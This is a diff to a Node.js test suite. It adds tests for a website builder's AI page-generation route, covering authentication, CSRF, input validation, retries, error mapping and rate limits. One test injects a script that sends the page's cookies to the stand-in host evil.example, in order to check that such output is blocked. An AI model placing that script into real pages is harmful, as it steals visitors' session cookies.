@@ -7,7 +7,8 @@ const test = require('node:test');
 const assert = require('node:assert/strict');
 const http = require('http');
 
-process.env.NODE_ENV = 'production';                       // exercise the production cookie/CORS settings
+process.env.NODE_ENV = 'production';
+process.env.AUTH_REGISTER_PER_HOUR = '1000';                       // exercise the production cookie/CORS settings
 process.env.SESSION_SECRET = 'test-only-secret-'.padEnd(48, 'x');
 process.env.ALLOWED_ORIGINS = 'https://pixelated-byte.github.io';
 const ORIGIN = 'https://pixelated-byte.github.io';
@@ -165,6 +166,67 @@ test('Gemini route: login + CSRF required, ownership enforced, validation unchan
   } finally { delete process.env.GEMINI_API_KEY; }
 }));
 
+// A well-formed generated page (what the model is asked to write): one h1, six sections, working anchors, no external resources, no invented facts.
+const GEN_SECTIONS = ['home', 'offer', 'how', 'about', 'faq', 'contact'];
+const generatedPage = (name = 'Brightside Bakery') => `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${name}</title><style>:root{--bg:#fbf4ea}${'.card{padding:20px;border-radius:12px}'.repeat(60)}</style></head><body><header><b>${name}</b><nav>${GEN_SECTIONS.map(s => `<a href="#${s}">${s}</a>`).join('')}</nav></header><main><section id="home"><h1>Sourdough baked fresh</h1></section>${GEN_SECTIONS.slice(1).map(s => `<section id="${s}"><h2>${s} section</h2><p>${'We bake sourdough and cakes for local families. '.repeat(8)}</p></section>`).join('')}</main><footer>${name}</footer></body></html>`;
+
+test('AI generation route: login + CSRF required, brief validated, ownership enforced, model output checked (a fake model is injected: no Gemini call is made)', { skip }, () => withServer(async port => {
+  const A = browser(port), B = browser(port), anon = browser(port); const ra = await reg(A), rb = await reg(B);
+  const mine = (await A.call('POST', '/api/projects', { body: proj(), csrf: ra.body.csrf })).body.project.id;
+  const brief = { name: 'Brightside Bakery', type: 'cafe', style: 'Elegant', audience: 'Local families', pages: ['Services'], desc: 'Family-run bakery in Leeds. We bake sourdough and celebration cakes and deliver locally.' };
+  const gen = (who, csrf, body) => who.call('POST', '/api/generate', { body, csrf });
+  const calls = []; let reply = async () => ({ text: generatedPage(), finishReason: 'STOP' });
+  app.deps.aiGenerate = async c => { calls.push(c); return reply(c); };
+  process.env.GENERATE_RATE_PER_MINUTE = '100';
+  try {
+    const out = await anon.call('POST', '/api/generate', { body: brief });
+    assert.equal(out.status, 401); assert.equal(out.body.error.code, 'AUTH_REQUIRED'); assert.equal(anon.cookie, '');
+    assert.equal((await anon.call('POST', '/api/generate', { body: brief, origin: OTHER })).status, 401);
+    delete process.env.GEMINI_API_KEY;
+    assert.equal((await gen(A, ra.body.csrf, brief)).body.error.code, 'NOT_CONFIGURED');
+    assert.equal((await gen(A, undefined, brief)).body.error.code, 'CSRF_INVALID');
+    assert.equal((await A.call('POST', '/api/generate', { body: brief, csrf: ra.body.csrf, origin: OTHER })).status, 403, 'a cookie from a disallowed Origin is refused');
+    process.env.GEMINI_API_KEY = 'test-key-not-real';
+    for (const bad of [{ ...brief, name: '' }, { ...brief, desc: 'too short' }, { ...brief, type: 'spaceship' }, { ...brief, style: 'Brutalist' }, {}]) {
+      const r = await gen(A, ra.body.csrf, bad); assert.equal(r.status, 400, JSON.stringify(bad)); assert.equal(r.body.error.code, 'BAD_BRIEF');
+    }
+    assert.equal((await gen(B, rb.body.csrf, { ...brief, projectId: mine })).status, 404, "cannot generate into another user's project");
+    assert.equal((await gen(A, ra.body.csrf, { ...brief, projectId: 'not-a-uuid' })).status, 400);
+    assert.equal(calls.length, 0, 'the model is never called for a rejected request');
+
+    const ok = await gen(A, ra.body.csrf, { ...brief, projectId: mine });
+    assert.equal(ok.status, 200); assert.equal(ok.body.attempts, 1); assert.equal(typeof ok.body.model, 'string');
+    assert.match(ok.body.html, /<h1>Sourdough baked fresh<\/h1>/); assert.match(ok.body.html, /<meta name="generator" content="LaunchForge AI">/);
+    assert.equal(calls.length, 1); assert.match(calls[0].prompt, /Brightside Bakery/); assert.match(calls[0].system, /Do NOT invent facts/);
+    assert.equal((await A.call('GET', '/api/projects/' + mine)).body.project.html, '<html></html>', 'generating never saves anything by itself');
+
+    calls.length = 0; reply = async () => ({ text: '<p>Sorry, no page</p>', finishReason: 'STOP' });                     // unusable output: retried once, then a clear error
+    const bad = await gen(A, ra.body.csrf, brief);
+    assert.equal(bad.status, 502); assert.equal(bad.body.error.code, 'AI_BAD_OUTPUT'); assert.equal(calls.length, 2); assert.equal(bad.body.html, undefined);
+    reply = async () => ({ text: generatedPage().replace('</main>', '<script>fetch("https://evil.example/?c="+document.cookie)</script></main>'), finishReason: 'STOP' });
+    const evil = await gen(A, ra.body.csrf, brief);
+    assert.equal(evil.status, 502); assert.equal(evil.body.html, undefined, 'a page that sends data elsewhere is never returned');
+
+    for (const [status, code, http] of [[429, 'AI_RATE_LIMIT', 429], [401, 'AI_AUTH', 502], [403, 'AI_AUTH', 502], [404, 'AI_MODEL', 502], [500, 'AI_PROVIDER', 502]]) {
+      reply = async () => { throw Object.assign(new Error('provider said: secret details'), { status }); };
+      const r = await gen(A, ra.body.csrf, brief);
+      assert.equal(r.status, http, String(status)); assert.equal(r.body.error.code, code); assert.ok(!JSON.stringify(r.body).includes('secret details'), 'provider details are not leaked');
+    }
+  } finally { delete app.deps.aiGenerate; delete process.env.GEMINI_API_KEY; delete process.env.GENERATE_RATE_PER_MINUTE; }
+}));
+test('AI generation route: rate limited per user (separately from /api/edit)', { skip }, () => withServer(async port => {
+  const A = browser(port), B = browser(port); const ra = await reg(A), rb = await reg(B);
+  const brief = { name: 'Brightside Bakery', type: 'cafe', style: 'Modern', desc: 'Family-run bakery in Leeds. We bake sourdough and celebration cakes.' };
+  app.deps.aiGenerate = async () => ({ text: generatedPage(), finishReason: 'STOP' });
+  process.env.GEMINI_API_KEY = 'test-key-not-real'; process.env.GENERATE_RATE_PER_MINUTE = '2';
+  try {
+    assert.equal((await A.call('POST', '/api/generate', { body: brief, csrf: ra.body.csrf })).status, 200);
+    assert.equal((await A.call('POST', '/api/generate', { body: brief, csrf: ra.body.csrf })).status, 200);
+    const r = await A.call('POST', '/api/generate', { body: brief, csrf: ra.body.csrf });
+    assert.equal(r.status, 429); assert.equal(r.body.error.code, 'RATE_LIMIT');
+    assert.equal((await B.call('POST', '/api/generate', { body: brief, csrf: rb.body.csrf })).status, 200, 'another user is not affected');
+  } finally { delete app.deps.aiGenerate; delete process.env.GEMINI_API_KEY; delete process.env.GENERATE_RATE_PER_MINUTE; }
+}));
 test('oversized bodies are rejected in the API error format', { skip }, () => withServer(async port => {
   const b = browser(port); const r = await reg(b);
   const big = await b.call('POST', '/api/projects', { csrf: r.body.csrf, raw: JSON.stringify({ name: 'x', html: 'y'.repeat(1300000) }) });
